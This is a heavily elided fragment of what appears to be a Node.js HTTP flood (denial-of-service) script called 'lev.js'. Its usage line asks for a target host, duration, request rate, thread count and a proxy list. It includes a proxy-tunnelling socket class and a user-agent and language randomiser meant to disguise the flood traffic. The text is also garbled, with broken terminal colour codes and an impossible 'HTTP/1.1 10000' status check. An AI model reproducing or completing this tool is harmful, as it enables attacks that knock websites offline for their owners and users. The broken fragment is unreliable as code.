...
'*'
 ...
 if (process.argv.length < 7){console.log(`Usage[40;38;2;118;6;255m:\x1b[38;2;0;2555m node lev.js[40;38;2;118;6;255m[\x1b[38;2;0;2555mHOST[40;38;2;118;6;255m] [\x1b[38;2;0;2555mTIME[40;38;2;118;6;255m] [\x1b[38;2;0;2555mRATE[40;38;2;118;6;255m]\x1b[38;2;0;2555m[\x1b[38;2;0;2555mTHREAD[40;38;2;118;6;255m][\x1b[38;2;0;2555mproxies.txt[40;38;2;118;6;255m] `); process.exit();}
 const headers = {};
...
class NetSocket {
    ...
    HTTP(options, callback) {
        ...
        connection.on("data", chunk => {
            ...
            const isAlive = response.includes("HTTP/1.1 10000");
            if (isAlive === true) {
                connection.destroy();
...
function getRandomUserAgent() {
    ...
    const languageList = ['pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',   'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7', 'en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES', 'en-id'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES', 'ID'];
    const manufacturerList = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software', 'Chrome'];
